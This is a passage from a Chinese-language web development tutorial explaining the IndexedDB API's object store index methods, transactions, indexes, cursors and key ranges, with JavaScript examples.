<h6 id="（10）IDBObjectStore-index"><a href="#（10）IDBObjectStore-index" class="headerlink" title="（10）IDBObjectStore.index()"></a>（10）IDBObjectStore.index()</h6><p><code>IDBObjectStore.index()</code>方法返回指定名称的索引对象 IDBIndex。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objectStore.index(name)</span><br></pre></td></tr></table></figure>
<p>有了索引以后，就可以针对索引所在的属性读取数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> t = db.transaction([<span class="string">&#x27;people&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> store = t.objectStore(<span class="string">&#x27;people&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> index = store.index(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> request = index.get(<span class="string">&#x27;foo&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码打开对象仓库以后，先用<code>index()</code>方法指定获取<code>name</code>属性的索引，然后用<code>get()</code>方法读取某个<code>name</code>属性(<code>foo</code>)对应的数据。如果<code>name</code>属性不是对应唯一值，这时<code>get()</code>方法有可能取回多个数据对象。另外，<code>get()</code>是异步方法，读取成功以后，只能在<code>success</code>事件的监听函数中处理数据。</p>
<h6 id="（11）IDBObjectStore-createIndex"><a href="#（11）IDBObjectStore-createIndex" class="headerlink" title="`（11）IDBObjectStore.createIndex()"></a>`（11）IDBObjectStore.createIndex()</h6><p><code>IDBObjectStore.createIndex()</code>方法用于新建当前数据库的一个索引。该方法只能在<code>VersionChange</code>监听函数里面调用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objectStore.createIndex(indexName, keyPath, objectParameters)</span><br></pre></td></tr></table></figure>
<p>该方法可以接受三个参数。</p>
<ul>
<li><code>indexName</code>：索引名</li>
<li><code>keyPath</code>：主键</li>
<li><code>objectParameters</code>：配置对象（可选）</li>
</ul>
<p>第三个参数可以配置以下属性。</p>
<ul>
<li><code>unique</code>：如果设为<code>true</code>，将不允许重复的值</li>
<li><code>multiEntry</code>：如果设为<code>true</code>，对于有多个值的主键数组，每个值将在索引里面新建一个条目，否则主键数组对应一个条目。</li>
</ul>
<p>假定对象仓库中的数据记录都是如下的<code>person</code>类型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name: name,</span><br><span class="line">  email: email,</span><br><span class="line">  created: <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以指定这个对象的某个属性来建立索引。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> store = db.createObjectStore(<span class="string">&#x27;people&#x27;</span>, &#123; <span class="attr">autoIncrement</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line">store.createIndex(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">store.createIndex(<span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码告诉索引对象，<code>name</code>属性不是唯一值，<code>email</code>属性是唯一值。</p>
<h6 id="（12）IDBObjectStore-deleteIndex"><a href="#（12）IDBObjectStore-deleteIndex" class="headerlink" title="（12）IDBObjectStore.deleteIndex()"></a>（12）IDBObjectStore.deleteIndex()</h6><p><code>IDBObjectStore.deleteIndex()</code>方法用于删除指定的索引。该方法只能在<code>VersionChange</code>监听函数里面调用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objectStore.deleteIndex(indexName)</span><br></pre></td></tr></table></figure>
<h6 id="（13）IDBObjectStore-openCursor"><a href="#（13）IDBObjectStore-openCursor" class="headerlink" title="（13）IDBObjectStore.openCursor()"></a>（13）IDBObjectStore.openCursor()</h6><p><code>IDBObjectStore.openCursor()</code>用于获取一个指针对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">IDBObjectStore.openCursor()</span><br></pre></td></tr></table></figure>
<p>指针对象可以用来遍历数据。该对象也是异步的，有自己的<code>success</code>和<code>error</code>事件，可以对它们指定监听函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> t = db.transaction([<span class="string">&#x27;test&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> store = t.objectStore(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cursor = store.openCursor();</span><br><span class="line"></span><br><span class="line">cursor.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> res = event.target.result;</span><br><span class="line">  <span class="keyword">if</span> (res) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Key&#x27;</span>, res.key);</span><br><span class="line">    <span class="built_in">console</span>.dir(<span class="string">&#x27;Data&#x27;</span>, res.value);</span><br><span class="line">    res.continue();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>监听函数接受一个事件对象作为参数，该对象的<code>target.result</code>属性指向当前数据记录。该记录的<code>key</code>和<code>value</code>分别返回主键和键值（即实际存入的数据）。<code>continue()</code>方法将光标移到下一个数据对象，如果当前数据对象已经是最后一个数据了，则光标指向null。</p>
<p><code>openCursor()</code>方法的第一个参数是主键值，或者一个 IDBKeyRange 对象。如果指定该参数，将只处理包含指定主键的记录；如果省略，将处理所有的记录。该方法还可以接受第二个参数，表示遍历方向，默认值为<code>next</code>，其他可能的值为<code>prev</code>、<code>nextunique</code>和<code>prevunique</code>。后两个值表示如果遇到重复值，会自动跳过。</p>
<h6 id="（14）IDBObjectStore-openKeyCursor"><a href="#（14）IDBObjectStore-openKeyCursor" class="headerlink" title="（14）IDBObjectStore.openKeyCursor()"></a>（14）IDBObjectStore.openKeyCursor()</h6><p><code>IDBObjectStore.openKeyCursor()</code>用于获取一个主键指针对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">IDBObjectStore.openKeyCursor()</span><br></pre></td></tr></table></figure>
<h4 id="14-8-IDBTransaction-对象"><a href="#14-8-IDBTransaction-对象" class="headerlink" title="14.8 IDBTransaction 对象"></a>14.8 IDBTransaction 对象</h4><p>IDBTransaction 对象用来异步操作数据库事务，所有的读写操作都要通过这个对象进行。</p>
<p><code>IDBDatabase.transaction()</code>方法返回的就是一个 IDBTransaction 对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> db;</span><br><span class="line"><span class="keyword">var</span> DBOpenRequest = <span class="built_in">window</span>.indexedDB.open(<span class="string">&#x27;demo&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">DBOpenRequest.onsuccess = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  db = DBOpenRequest.result;</span><br><span class="line">  <span class="keyword">var</span> transaction = db.transaction([<span class="string">&#x27;demo&#x27;</span>], <span class="string">&#x27;readwrite&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  transaction.oncomplete = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;transaction success&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  transaction.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;transaction error: &#x27;</span> + transaction.error);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> objectStore = transaction.objectStore(<span class="string">&#x27;demo&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> objectStoreRequest = objectStore.add(&#123; <span class="attr">foo</span>: <span class="number">1</span> &#125;);</span><br><span class="line"></span><br><span class="line">  objectStoreRequest.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;add data success&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>事务的执行顺序是按照创建的顺序，而不是发出请求的顺序。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> trans1 = db.transaction(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;readwrite&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> trans2 = db.transaction(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;readwrite&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> objectStore2 = trans2.objectStore(<span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> objectStore1 = trans1.objectStore(<span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line">objectStore2.put(<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;key&#x27;</span>);</span><br><span class="line">objectStore1.put(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;key&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，key对应的键值最终是2，而不是1。因为事务trans1先于trans2创建，所以首先执行。</p>
<p>注意，事务有可能失败，只有监听到事务的complete事件，才能保证事务操作成功。</p>
<p>IDBTransaction 对象有以下属性。</p>
<ul>
<li><code>IDBTransaction.db</code>：返回当前事务所在的数据库对象 IDBDatabase。</li>
<li><code>IDBTransaction.error</code>：返回当前事务的错误。如果事务没有结束，或者事务成功结束，或者被手动终止，该方法返回<code>null</code>。</li>
<li><code>IDBTransaction.mode</code>：返回当前事务的模式，默认是<code>readonly</code>（只读），另一个值是<code>readwrite</code>。</li>
<li><code>IDBTransaction.objectStoreNames</code>：返回一个类似数组的对象 DOMStringList，成员是当前事务涉及的对象仓库的名字。</li>
<li><code>IDBTransaction.onabort</code>：指定<code>abort</code>事件（事务中断）的监听函数。</li>
<li><code>IDBTransaction.oncomplete</code>：指定<code>complete</code>事件（事务成功）的监听函数。</li>
<li><code>IDBTransaction.onerror</code>：指定<code>error</code>事件（事务失败）的监听函数。</li>
</ul>
<p>IDBTransaction 对象有以下方法。</p>
<ul>
<li><code>IDBTransaction.abort()</code>：终止当前事务，回滚所有已经进行的变更。</li>
<li><code>IDBTransaction.objectStore(name)</code>：返回指定名称的对象仓库 IDBObjectStore。</li>
</ul>
<h4 id="14-9-IDBIndex-对象"><a href="#14-9-IDBIndex-对象" class="headerlink" title="14.9 IDBIndex 对象"></a>14.9 IDBIndex 对象</h4><p>IDBIndex 对象代表数据库的索引，通过这个对象可以获取数据库里面的记录。数据记录的主键默认就是带有索引，IDBIndex 对象主要用于通过除主键以外的其他键，建立索引获取对象。</p>
<p>IDBIndex 是持久性的键值对存储。只要插入、更新或删除数据记录，引用的对象库中的记录，索引就会自动更新。</p>
<p><code>IDBObjectStore.index()</code>方法可以获取 IDBIndex 对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> transaction = db.transaction([<span class="string">&#x27;contactsList&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> objectStore = transaction.objectStore(<span class="string">&#x27;contactsList&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> myIndex = objectStore.index(<span class="string">&#x27;lName&#x27;</span>);</span><br><span class="line"></span><br><span class="line">myIndex.openCursor().onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cursor = event.target.result;</span><br><span class="line">  <span class="keyword">if</span> (cursor) &#123;</span><br><span class="line">    <span class="keyword">var</span> tableRow = <span class="built_in">document</span>.createElement(<span class="string">&#x27;tr&#x27;</span>);</span><br><span class="line">    tableRow.innerHTML =   <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.value.id + <span class="string">&#x27;&lt;/td&gt;&#x27;</span></span><br><span class="line">                         + <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.value.lName + <span class="string">&#x27;&lt;/td&gt;&#x27;</span></span><br><span class="line">                         + <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.value.fName + <span class="string">&#x27;&lt;/td&gt;&#x27;</span></span><br><span class="line">                         + <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.value.jTitle + <span class="string">&#x27;&lt;/td&gt;&#x27;</span></span><br><span class="line">                         + <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.value.company + <span class="string">&#x27;&lt;/td&gt;&#x27;</span></span><br><span class="line">                         + <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.value.eMail + <span class="string">&#x27;&lt;/td&gt;&#x27;</span></span><br><span class="line">                         + <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.value.phone + <span class="string">&#x27;&lt;/td&gt;&#x27;</span></span><br><span class="line">                         + <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.value.age + <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">    tableEntry.appendChild(tableRow);</span><br><span class="line"></span><br><span class="line">    cursor.continue();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Entries all displayed.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>IDBIndex 对象有以下属性。</p>
<ul>
<li><code>IDBIndex.name</code>：字符串，索引的名称。</li>
<li><code>IDBIndex.objectStore</code>：索引所在的对象仓库。</li>
<li><code>IDBIndex.keyPath</code>：索引的主键。</li>
<li><code>IDBIndex.multiEntry</code>：布尔值，针对keyPath为数组的情况，如果设为true，创建数组时，每个数组成员都会有一个条目，否则每个数组都只有一个条目。</li>
<li><code>1IDBIndex.unique</code>：布尔值，表示创建索引时是否允许相同的主键。</li>
</ul>
<p>IDBIndex 对象有以下方法，它们都是异步的，立即返回的都是一个 IDBRequest 对象。</p>
<ul>
<li>`IDBIndex.count()：用来获取记录的数量。它可以接受主键或 IDBKeyRange 对象作为参数，这时只返回符合主键的记录数量，否则返回所有记录的数量。</li>
<li>`IDBIndex.get(key)：用来获取符合指定主键的数据记录。</li>
<li>`IDBIndex.getKey(key)：用来获取指定的主键。</li>
<li>`IDBIndex.getAll()：用来获取所有的数据记录。它可以接受两个参数，都是可选的，第一个参数用来指定主键，第二个参数用来指定返回记录的数量。如果省略这两个参数，则返回所有记录。由于获取成功时，浏览器必须生成所有对象，所以对性能有影响。如果数据集比较大，建议使用 IDBCursor 对象。</li>
<li>`IDBIndex.getAllKeys()：该方法与IDBIndex.getAll()方法相似，区别是获取所有主键。</li>
<li>`IDBIndex.openCursor()：用来获取一个 IDBCursor 对象，用来遍历索引里面的所有条目。</li>
<li>`IDBIndex.openKeyCursor()：该方法与IDBIndex.openCursor()方法相似，区别是遍历所有条目的主键。</li>
</ul>
<h4 id="14-10-IDBCursor-对象"><a href="#14-10-IDBCursor-对象" class="headerlink" title="14.10 IDBCursor 对象"></a>14.10 IDBCursor 对象</h4><p>IDBCursor 对象代表指针对象，用来遍历数据仓库（IDBObjectStore）或索引（IDBIndex）的记录。</p>
<p>IDBCursor 对象一般通过<code>IDBObjectStore.openCursor()</code>方法获得。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> transaction = db.transaction([<span class="string">&#x27;rushAlbumList&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> objectStore = transaction.objectStore(<span class="string">&#x27;rushAlbumList&#x27;</span>);</span><br><span class="line"></span><br><span class="line">objectStore.openCursor(<span class="literal">null</span>, <span class="string">&#x27;next&#x27;</span>).onsuccess = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cursor = event.target.result;</span><br><span class="line">  <span class="keyword">if</span> (cursor) &#123;</span><br><span class="line">    <span class="keyword">var</span> listItem = <span class="built_in">document</span>.createElement(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line">      listItem.innerHTML = cursor.value.albumTitle + <span class="string">&#x27;, &#x27;</span> + cursor.value.year;</span><br><span class="line">      list.appendChild(listItem);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">console</span>.log(cursor.source);</span><br><span class="line">      cursor.continue();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;Entries all displayed.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>IDBCursor 对象的属性。</p>
<ul>
<li><code>IDBCursor.source</code>：返回正在遍历的对象仓库或索引。</li>
<li><code>IDBCursor.direction</code>：字符串，表示指针遍历的方向。共有四个可能的值：next（从头开始向后遍历）、nextunique（从头开始向后遍历，重复的值只遍历一次）、prev（从尾部开始向前遍历）、prevunique（从尾部开始向前遍历，重复的值只遍历一次）。该属性通过<code>IDBObjectStore.openCursor()</code>方法的第二个参数指定，一旦指定就不能改变了。</li>
<li><code>IDBCursor.key</code>：返回当前记录的主键。</li>
<li><code>IDBCursor.value</code>：返回当前记录的数据值。</li>
<li><code>IDBCursor.primaryKey</code>：返回当前记录的主键。对于数据仓库（objectStore）来说，这个属性等同于 IDBCursor.key；对于索引，IDBCursor.key 返回索引的位置值，该属性返回数据记录的主键。</li>
</ul>
<p>IDBCursor 对象有如下方法。</p>
<ul>
<li><code>IDBCursor.advance(n)</code>：指针向前移动 n 个位置。</li>
<li><code>IDBCursor.continue()</code>：指针向前移动一个位置。它可以接受一个主键作为参数，这时会跳转到这个主键。</li>
<li><code>IDBCursor.continuePrimaryKey()</code>：该方法需要两个参数，第一个是key，第二个是primaryKey，将指针移到符合这两个参数的位置。</li>
<li><code>IDBCursor.delete()</code>：用来删除当前位置的记录，返回一个 IDBRequest 对象。该方法不会改变指针的位置。</li>
<li><code>IDBCursor.update()</code>：用来更新当前位置的记录，返回一个 IDBRequest 对象。它的参数是要写入数据库的新的值。</li>
</ul>
<h4 id="14-11-IDBKeyRange-对象"><a href="#14-11-IDBKeyRange-对象" class="headerlink" title="14.11 IDBKeyRange 对象"></a>14.11 IDBKeyRange 对象</h4><p>IDBKeyRange 对象代表数据仓库（object store）里面的一组主键。根据这组主键，可以获取数据仓库或索引里面的一组记录。</p>
<p>IDBKeyRange 可以只包含一个值，也可以指定上限和下限。它有四个静态方法，用来指定主键的范围。</p>
<ul>
<li><code>IDBKeyRange.lowerBound()</code>：指定下限。</li>
<li><code>IDBKeyRange.upperBound()</code>：指定上限。</li>
<li><code>IDBKeyRange.bound()</code>：同时指定上下限。</li>
<li><code>IDBKeyRange.only()</code>：指定只包含一个值。</li>
</ul>
<p>下面是一些代码实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// All keys ≤ x</span></span><br><span class="line"><span class="keyword">var</span> r1 = IDBKeyRange.upperBound(x);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All keys &lt; x</span></span><br><span class="line"><span class="keyword">var</span> r2 = IDBKeyRange.upperBound(x, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All keys ≥ y</span></span><br><span class="line"><span class="keyword">var</span> r3 = IDBKeyRange.lowerBound(y);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All keys &gt; y</span></span><br><span class="line"><span class="keyword">var</span> r4 = IDBKeyRange.lowerBound(y, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All keys ≥ x &amp;&amp; ≤ y</span></span><br><span class="line"><span class="keyword">var</span> r5 = IDBKeyRange.bound(x, y);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All keys &gt; x &amp;&amp;&lt; y</span></span><br><span class="line"><span class="keyword">var</span> r6 = IDBKeyRange.bound(x, y, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All keys &gt; x &amp;&amp; ≤ y</span></span><br><span class="line"><span class="keyword">var</span> r7 = IDBKeyRange.bound(x, y, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All keys ≥ x &amp;&amp;&lt; y</span></span><br><span class="line"><span class="keyword">var</span> r8 = IDBKeyRange.bound(x, y, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// The key = z</span></span><br><span class="line"><span class="keyword">var</span> r9 = IDBKeyRange.only(z);</span><br></pre></td></tr></table></figure>
<p><code>IDBKeyRange.lowerBound()</code>、<code>IDBKeyRange.upperBound()</code>、<code>IDBKeyRange.bound()</code>这三个方法默认包括端点值，可以传入一个布尔值，修改这个属性。</p>
<p>与之对应，IDBKeyRange 对象有四个只读属性。</p>
<p><code>IDBKeyRange.lower</code>：返回下限<br><code>IDBKeyRange.lowerOpen</code>：布尔值，表示下限是否为开区间（即下限是否排除在范围之外）<br><code>IDBKeyRange.upper</code>：返回上限<br><code>IDBKeyRange.upperOpen</code>：布尔值，表示上限是否为开区间（即上限是否排除在范围之外）</p>
<p>IDBKeyRange 实例对象生成以后，将它作为参数输入 IDBObjectStore 或 IDBIndex 对象的<code>openCursor()</code>方法，就可以在所设定的范围内读取数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> t = db.transaction([<span class="string">&#x27;people&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> store = t.objectStore(<span class="string">&#x27;people&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> index = store.index(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> range = IDBKeyRange.bound(<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;D&#x27;</span>);</span><br><span class="line"></span><br><span class="line">index.openCursor(range).onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cursor = e.target.result;</span><br><span class="line">  <span class="keyword">if</span> (cursor) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(cursor.key + <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> field <span class="keyword">in</span> cursor.value) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(cursor.value[field]);</span><br><span class="line">    &#125;</span><br><span class="line">    cursor.continue();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>IDBKeyRange 有一个实例方法<code>includes(key)</code>，返回一个布尔值，表示某个主键是否包含在当前这个主键组之内。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> keyRangeValue = IDBKeyRange.bound(<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">keyRangeValue.includes(<span class="string">&#x27;F&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">keyRangeValue.includes(<span class="string">&#x27;W&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 浏览器模型-IndexedDB API</tag>
      </tags>
  </entry>
</search>
